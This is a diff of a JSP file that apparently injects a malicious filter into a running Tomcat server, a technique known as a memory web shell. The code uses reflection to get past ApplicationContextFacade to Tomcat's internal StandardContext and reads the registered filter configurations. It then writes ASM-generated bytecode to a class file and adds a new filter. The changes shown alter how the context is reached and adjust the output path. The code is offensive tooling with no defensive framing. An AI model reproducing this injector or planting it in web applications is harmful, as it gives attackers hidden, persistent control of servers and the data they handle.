@@ -15,6 +15,7 @@
 <%@ page import="jdk.internal.org.objectweb.asm.*" %>
 <%@ page import="static jdk.internal.org.objectweb.asm.Opcodes.*" %>
 <%@ page import="java.lang.reflect.Method" %>
+<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
 <%!
     public HashMap<String, Object> getFilterConfig(StandardContext standardContext) throws Exception {
         Field _filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
@@ -120,8 +121,15 @@
         String startName = "";
         String path = "";
 
-        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-        StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
+        ServletContext servletContext = request.getServletContext();
+        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
+        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
+        applicationContextField.setAccessible(true);
+        ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
+        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+        standardContextField.setAccessible(true);
+        StandardContext standardCtx = (StandardContext)standardContextField.get(applicationContext);
+
         HashMap<String, Object> filterConfigs1 = getFilterConfig(standardCtx);
         Object[] filterMaps1 = getFilterMaps(standardCtx);
         List<String> names = new ArrayList<>();
@@ -177,7 +185,6 @@
 
         Field appctx = standardCtx.getClass().getDeclaredField("context");
         appctx.setAccessible(true);
-        ApplicationContext applicationContext = (ApplicationContext) appctx.get(standardCtx);
 
         Field stdctx = applicationContext.getClass().getDeclaredField("context");
         stdctx.setAccessible(true);
@@ -190,7 +197,7 @@
         if (filterConfigs.get(finalName) == null) {
             byte[] code = getFilter(startName + "/" + newClassName);
             Files.write(
-                    Paths.get(path + "/" + newClassName + ".class"),
+                    Paths.get("/"+path + "/" + newClassName + ".class"),
                     code);
             String tmpName = startName + "/" + newClassName;
             tmpName = tmpName.replaceAll("/", ".");
